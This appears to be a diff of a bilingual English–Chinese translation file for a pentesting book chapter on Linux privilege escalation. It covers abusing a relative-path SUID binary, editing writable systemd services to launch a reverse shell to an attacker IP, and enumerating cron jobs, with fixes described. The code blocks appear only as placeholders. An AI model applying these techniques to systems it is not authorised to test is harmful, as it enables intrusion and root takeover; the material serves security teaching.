 - en: 'Taking a look at the **/home/user3/shell** file, we run the **file** command
     and find that it’s a compiled executable, as shown in the following figure:'
+  id: totrans-220
   prefs: []
   type: TYPE_NORMAL
+  zh: 查看 **/home/user3/shell** 文件，我们运行 `file` 命令，发现它是一个编译过的可执行文件，如下图所示：
 - en: '![Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable](image/B22229_11_34.jpg)'
+  id: totrans-221
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.34 – 在 shell 上使用 `file` 命令显示它是一个编译过的 ELF 可执行文件](image/B22229_11_34.jpg)'
 - en: Figure 11.34 – The file command on shell shows that it’s a compiled ELF executable
+  id: totrans-222
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.34 – 在 shell 上使用 `file` 命令显示它是一个编译过的 ELF 可执行文件
 - en: 'There are Linux debugging programs that will trace the execution and print
     system and library calls. However, we don’t need to make this any more complicated
     than it is. If we run the **strings** command ( **strings /home/user3/shell**
     ), we find a reference to a file, **./.script.sh** , as shown in the next figure:'
+  id: totrans-223
   prefs: []
   type: TYPE_NORMAL
+  zh: 有一些 Linux 调试程序可以追踪执行并打印系统和库调用。然而，我们不需要将其复杂化。如果我们运行 **strings** 命令（**strings
+    /home/user3/shell**），我们会发现它引用了一个文件 **./.script.sh**，如下图所示：
 - en: '![Figure 11.35 – The output of the strings command shows that it calls a shell
     script file](image/B22229_11_35.jpg)'
+  id: totrans-224
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.35 – `strings` 命令的输出显示它调用了一个 shell 脚本文件](image/B22229_11_35.jpg)'
 - en: Figure 11.35 – The output of the strings command shows that it calls a shell
     script file
+  id: totrans-225
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.35 – `strings` 命令的输出显示它调用了一个 shell 脚本文件
 - en: I check the contents of this file and it’s simply a taunt and doesn’t contain
     anything useful. However, I see in the **strings** output that **.script.sh**
     is called using its relative path, **./.script.sh** . This means that instead
@@ -940,238 +1418,365 @@
     a malicious version of **.script.sh** , and execute **/home/user3/shell** , which
     will call the local copy of **.script.sh** , since we don’t have permission to
     write to the original copy.
+  id: totrans-226
   prefs: []
   type: TYPE_NORMAL
+  zh: 我检查了这个文件的内容，发现它只是一个嘲弄，不包含任何有用的信息。然而，我在 **strings** 输出中看到通过相对路径调用了 **.script.sh**
+    文件，路径为 **./.script.sh**。这意味着它并没有调用 **/home/user3/.script.sh** 的绝对路径，而是相对于当前工作目录调用它。我们可以
+    **cd** 到 **/tmp** 目录，创建一个恶意版本的 **.script.sh**，然后执行 **/home/user3/shell**，这将调用本地的
+    **.script.sh** 副本，因为我们没有权限修改原始文件。
 - en: 'The following figure demonstrates this process of exploiting the **/home/user3/shell**
     SUID file to get a root shell:'
+  id: totrans-227
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下图示例展示了利用 **/home/user3/shell** SUID 文件获取 root shell 的过程：
 - en: '![Figure 11.36 – Exploiting an SUID file to gain root privileges](image/B22229_11_36.jpg)'
+  id: totrans-228
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.36 – 利用 SUID 文件获取 root 权限](image/B22229_11_36.jpg)'
 - en: Figure 11.36 – Exploiting an SUID file to gain root privileges
+  id: totrans-229
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.36 – 利用 SUID 文件获取 root 权限
 - en: 'Now that you’ve seen how dangerous SUID and SGID executables can be, let’s
     talk about how to secure them to prevent exploitation. If we examine the file
     permissions, we see that *others* can read and execute, as shown in the following
     figure:'
+  id: totrans-230
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在你已经了解了 SUID 和 SGID 可执行文件可能带来的危害，接下来我们来讨论如何保护它们以防止被利用。如果我们检查文件权限，会看到 *其他用户*
+    可以读取和执行，如下图所示：
 - en: '![Figure 11.37 – Examining the file permissions of the SUID shell](image/B22229_11_37.jpg)'
+  id: totrans-231
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.37 – 检查 SUID shell 文件的权限](image/B22229_11_37.jpg)'
 - en: Figure 11.37 – Examining the file permissions of the SUID shell
+  id: totrans-232
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.37 – 检查 SUID shell 文件的权限
 - en: 'It currently has the numeric file permissions of **4755** . To keep the SUID
     set and secure the file from those who are not the **root** user or in the **root**
     group, we can remediate this using the following command:'
+  id: totrans-233
   prefs: []
   type: TYPE_NORMAL
+  zh: 目前它的文件权限为数字 **4755**。为了保持 SUID 设置，并保护该文件不被非 **root** 用户或不在 **root** 组中的用户执行，我们可以使用以下命令来修复：
 - en: '[PRE16]'
+  id: totrans-234
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE16]'
 - en: 'After entering this command, you can see in the following figure that anyone
     other than **root** or a member of the **root** group can no longer execute this
     file:'
+  id: totrans-235
   prefs: []
   type: TYPE_NORMAL
+  zh: 输入此命令后，你可以在以下图示中看到，除了 **root** 或属于 **root** 组的用户之外，其他人将无法再执行该文件：
 - en: '![Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID
     file](image/B22229_11_38.jpg)'
+  id: totrans-236
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.38 – 输入 chmod 命令修复这个易受攻击的 SUID 文件](image/B22229_11_38.jpg)'
 - en: Figure 11.38 – Entering the chmod command to remediate this vulnerable SUID
     file
+  id: totrans-237
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.38 – 输入 `chmod` 命令修复这个易受攻击的 SUID 文件
 - en: This concludes the topic of exploiting and securing SUID and SGID executables.
     In the next section, you’ll learn about enumerating and exploiting misconfigured
     services and scheduled tasks in Bash.
+  id: totrans-238
   prefs: []
   type: TYPE_NORMAL
+  zh: 以上内容是关于利用和保护 SUID 和 SGID 可执行文件的介绍。在下一部分，你将学习如何枚举和利用配置错误的服务和计划任务。
 - en: Leveraging misconfigured services and scheduled tasks
+  id: totrans-239
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 利用配置错误的服务和计划任务
 - en: In cybersecurity, understanding how to enumerate, exploit, and secure misconfigured
     services and cron jobs on Linux systems is essential. This section will guide
     you through the process using Bash scripting, providing practical examples and
     explanations.
+  id: totrans-240
   prefs: []
   type: TYPE_NORMAL
+  zh: 在网络安全中，了解如何列举、利用和保护 Linux 系统上配置错误的服务和 cron 作业至关重要。本节将通过 Bash 脚本引导您完成这一过程，提供实用的示例和解释。
 - en: '**Systemd** is a system and service manager for Linux operating systems. It
     is responsible for initializing the system, managing system processes, and handling
     system services. Systemd services are essential components that define how various
     applications and processes should be started, stopped, and managed.'
+  id: totrans-241
   prefs: []
   type: TYPE_NORMAL
+  zh: '**Systemd** 是 Linux 操作系统的系统和服务管理器。它负责初始化系统、管理系统进程并处理系统服务。Systemd 服务是定义各种应用程序和进程如何启动、停止和管理的重要组件。'
 - en: Systemd services are defined by unit files, which are configuration files that
     describe how to manage a service or process. These unit files typically have a
     **.service** extension and are located in directories such as **/etc/systemd/system/**
     or **/lib/systemd/system/** . Each service unit file contains several sections
     that specify the behavior of the service.
+  id: totrans-242
   prefs: []
   type: TYPE_NORMAL
+  zh: Systemd 服务由单元文件定义，单元文件是描述如何管理服务或进程的配置文件。这些单元文件通常具有 **.service** 扩展名，并位于 **/etc/systemd/system/**
+    或 **/lib/systemd/system/** 等目录中。每个服务单元文件包含几个部分，指定服务的行为。
 - en: 'To begin, we need to list all active services on the system. This can be achieved
     using the **systemctl** command, as shown next:'
+  id: totrans-243
   prefs: []
   type: TYPE_NORMAL
+  zh: 首先，我们需要列出系统上所有活动的服务。可以使用 **systemctl** 命令实现，如下所示：
 - en: '[PRE17]'
+  id: totrans-244
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE17]'
 - en: This command lists all active services on the system.
+  id: totrans-245
   prefs: []
   type: TYPE_NORMAL
+  zh: 此命令列出了系统上所有活动的服务。
 - en: Next, we need to check the permissions of these services to identify any misconfigurations.
+  id: totrans-246
   prefs: []
   type: TYPE_NORMAL
+  zh: 接下来，我们需要检查这些服务的权限，以识别任何配置错误。
 - en: 'Writable service files can be exploited by modifying them to execute malicious
     code. The following command searches for writable files i n the **systemd** directory:'
+  id: totrans-247
   prefs: []
   type: TYPE_NORMAL
+  zh: 可写服务文件可以通过修改它们来执行恶意代码。以下命令会在 **systemd** 目录中搜索可写文件：
 - en: '[PRE18]'
+  id: totrans-248
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE18]'
 - en: The output of this command doesn’t return any results on the target system.
     However, let’s continue and learn how to modify writable service files if you
     find one during your pentests. If a writable service file is found, it can be
     modified to execute a reverse shell.
+  id: totrans-249
   prefs: []
   type: TYPE_NORMAL
+  zh: 此命令的输出不会返回目标系统的任何结果。但是，让我们继续并学习如何修改可写的服务文件，如果在渗透测试中找到一个文件的话。如果发现一个可写服务文件，可以修改它来执行反向
+    shell。
 - en: 'Here is an example of modifying a writable service file (replace **attacker_ip**
     with the appropriate val ue from your Kali system):'
+  id: totrans-250
   prefs: []
   type: TYPE_NORMAL
+  zh: 这是修改可写服务文件的示例（将 **attacker_ip** 替换为您的 Kali 系统中的适当值）：
 - en: '[PRE19]'
+  id: totrans-251
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE19]'
 - en: 'On your Kali system, execute the following command to be ready to receive the
     reverse shell:'
+  id: totrans-252
   prefs: []
   type: TYPE_NORMAL
+  zh: 在您的 Kali 系统上执行以下命令，以准备接收反向 shell：
 - en: '[PRE20]'
+  id: totrans-253
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE20]'
 - en: 'Then, reload the systemd manager configuration, as shown:'
+  id: totrans-254
   prefs: []
   type: TYPE_NORMAL
+  zh: 然后，重新加载 systemd 管理器配置，如下所示：
 - en: '[PRE21]'
+  id: totrans-255
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE21]'
 - en: 'Restart the vulnerable service, as shown:'
+  id: totrans-256
   prefs: []
   type: TYPE_NORMAL
+  zh: 重启易受攻击的服务，如下所示：
 - en: '[PRE22]'
+  id: totrans-257
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE22]'
 - en: This should result in receiving a reverse shell from the target.
+  id: totrans-258
   prefs: []
   type: TYPE_NORMAL
+  zh: 这样应该会收到来自目标的反向 shell。
 - en: Now that you’ve learned how to enumerate and exploit vulnerable services, let’s
     move ahead and examine **cron jobs** .
+  id: totrans-259
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在，您已经学会了如何列举和利用易受攻击的服务，让我们继续深入探讨 **cron 作业**。
 - en: Cron jobs are scheduled tasks that run automatically at specified intervals
     on Unix-like operating systems. They are managed by the **cron daemon** , a background
     process that executes commands at predetermined times and dates. In cybersecurity,
     cron jobs can be invaluable for automating routine tasks, monitoring systems,
     and maintaining security protocols. Cron jobs can be exploited if misconfigured.
+  id: totrans-260
   prefs: []
   type: TYPE_NORMAL
+  zh: Cron 作业是计划任务，在类 Unix 操作系统中会在指定的时间间隔内自动运行。它们由 **cron 守护进程** 管理，后者是一个在后台执行命令的进程，根据预定的时间和日期执行命令。在网络安全中，cron
+    作业对于自动化常规任务、监控系统和维护安全协议非常有价值。如果配置错误，cron 作业可能会被利用。
 - en: 'The following Bash command is used to examine scheduled tasks on a Linux system,
     specifically, to identify potential privilege escalation opportunities related
     to cr on jobs and scheduled tasks:'
+  id: totrans-261
   prefs: []
   type: TYPE_NORMAL
+  zh: 以下 Bash 命令用于检查 Linux 系统上的计划任务，特别是识别与 cron 作业和计划任务相关的潜在权限提升机会：
 - en: '[PRE23]'
+  id: totrans-262
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE23]'
 - en: By running this command, you are looking for all scheduled tasks ( **cron**
     jobs, **at** jobs, and **anacron** jobs) that are configured on the system, excluding
     any commented lines.
+  id: totrans-263
   prefs: []
   type: TYPE_NORMAL
+  zh: 通过运行此命令，您可以查找系统上所有已配置的计划任务（**cron** 作业，**at** 作业和 **anacron** 作业），排除任何被注释掉的行。
 - en: 'The output of this command on the target system can be seen in the following
     figure:'
+  id: totrans-264
   prefs: []
   type: TYPE_NORMAL
+  zh: 该命令在目标系统上的输出如以下图所示：
 - en: '![Figure 11.39 – The output of the command that examines scheduled tasks](image/B22229_11_39.jpg)'
+  id: totrans-265
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.39 – 检查计划任务命令的输出](image/B22229_11_39.jpg)'
 - en: Figure 11.39 – The output of the command that examines scheduled tasks
+  id: totrans-266
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.39 – 检查计划任务命令的输出
 - en: You can see in the figure that **autoscript.sh** is running as **root** .
+  id: totrans-267
   prefs: []
   type: TYPE_NORMAL
+  zh: 从图中可以看到，**autoscript.sh** 正在以 **root** 身份运行。
 - en: 'The **autoscript.sh** entry was also discovered earlier in the chapter, as
     seen in the **pspy64** command output, shown here:'
+  id: totrans-268
   prefs: []
   type: TYPE_NORMAL
+  zh: '**autoscript.sh** 条目也在本章早些时候被发现，如下所示的 **pspy64** 命令输出：'
 - en: '![Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry
     running as root](image/B22229_11_40.jpg)'
+  id: totrans-269
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.40 – pspy64 命令输出显示 autoscript.sh 作为 root 运行](image/B22229_11_40.jpg)'
 - en: Figure 11.40 – The pspy64 command output reveals the autoscript.sh entry running
     as root
+  id: totrans-270
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.40 – pspy64 命令输出显示 autoscript.sh 作为 root 运行
 - en: 'We examine the **autoscript.sh** file content to find what it’s executing,
     as shown in the following figure:'
+  id: totrans-271
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们检查 **autoscript.sh** 文件的内容，以了解它执行的操作，如下图所示：
 - en: '![Figure 11.41 – Examining the content of autoscript.sh to understand its purpose](image/B22229_11_41.jpg)'
+  id: totrans-272
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.41 – 检查 autoscript.sh 的内容以了解其目的](image/B22229_11_41.jpg)'
 - en: Figure 11.41 – Examining the content of autoscript.sh to understand its purpose
+  id: totrans-273
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.41 – 检查 autoscript.sh 的内容以了解其目的
 - en: We see that it seems to be incomplete, according to the remark. However, it
     does execute an interactive shell with the **bash -** **i** command.
+  id: totrans-274
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们看到根据注释，它似乎不完整。然而，它确实执行了一个带有 **bash -** **i** 命令的交互式 shell。
 - en: 'When examining the file permissions, we find that **user6** doesn’t have permission
     to write to the file, and it’s not SUID:'
+  id: totrans-275
   prefs: []
   type: TYPE_NORMAL
+  zh: 在检查文件权限时，我们发现 **user6** 没有权限写入该文件，并且该文件不是 SUID 文件：
 - en: '![Figure 11.42 – Examining the autoscript.sh file permissions](image/B22229_11_42.jpg)'
+  id: totrans-276
   prefs: []
   type: TYPE_IMG
+  zh: '![图 11.42 – 检查 autoscript.sh 文件权限](image/B22229_11_42.jpg)'
 - en: Figure 11.42 – Examining the autoscript.sh file permissions
+  id: totrans-277
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 11.42 – 检查 autoscript.sh 文件权限
 - en: From this perspective, we’ll need to have a shell as **user4** or obtain the
     password for the account to exploit this privilege escalation vector. We have
     neither in this scenario.
+  id: totrans-278
   prefs: []
   type: TYPE_NORMAL
+  zh: 从这个角度来看，我们需要拥有 **user4** 的 shell 或获取该账户的密码，才能利用此权限提升向量。在这个场景中，我们两者都没有。
 - en: Securing vulnerable services and cron jobs is approached in the same way that
     we previously secured SUID and SGID executables, by examining file permissions
     and ensuring that unauthorized users do not have access to edit or run them.
+  id: totrans-279
   prefs: []
   type: TYPE_NORMAL
+  zh: 安全配置易受攻击的服务和 cron 任务的方式与我们之前保护 SUID 和 SGID 可执行文件的方法相同，即通过检查文件权限，确保未经授权的用户无法编辑或执行它们。
 - en: By following these steps, you can enumerate and exploit misconfigured services
     and cron jobs on Linux systems using Bash scripting. Understanding these vulnerabilities
     helps in securing systems against potential attacks.
+  id: totrans-280
   prefs: []
   type: TYPE_NORMAL
+  zh: 通过遵循这些步骤，你可以使用 Bash 脚本枚举和利用 Linux 系统中配置错误的服务和 cron 任务。了解这些漏洞有助于提高系统的安全性，防范潜在的攻击。
 - en: Summary
+  id: totrans-281
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 总结
 - en: This chapter was dedicated to exploring the techniques and strategies for achieving
     privilege escalation through the Bash shell in pentesting scenarios. It focused
     on identifying and exploiting system vulnerabilities and misconfigurations that
     could lead to elevated privileges in a Linux Bash environment.
+  id: totrans-282
   prefs: []
   type: TYPE_NORMAL
+  zh: 本章致力于探索在渗透测试场景中通过 Bash shell 实现权限提升的技术和策略。它专注于识别和利用系统漏洞和配置错误，这些漏洞和配置错误可能导致在
+    Linux Bash 环境中获得提升的权限。
 - en: Linux systems are frequently used to serve web applications. Knowledge of how
     to escalate privileges would be valuable to a pentester who has exploited a web
     application and gained a low-privilege shell.
+  id: totrans-283
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux 系统常用于提供 Web 应用服务。了解如何提升权限对渗透测试人员而言是非常有价值的，特别是在他们利用 Web 应用漏洞并获得低权限 shell
+    后。
 - en: The next chapter will examine post-exploitation persistence and pivoting in
     a Linux Bash environment.
+  id: totrans-284
   prefs: []
   type: TYPE_NORMAL
+  zh: 下一章将探讨在 Linux Bash 环境中的后渗透持久性和 pivoting 技术。
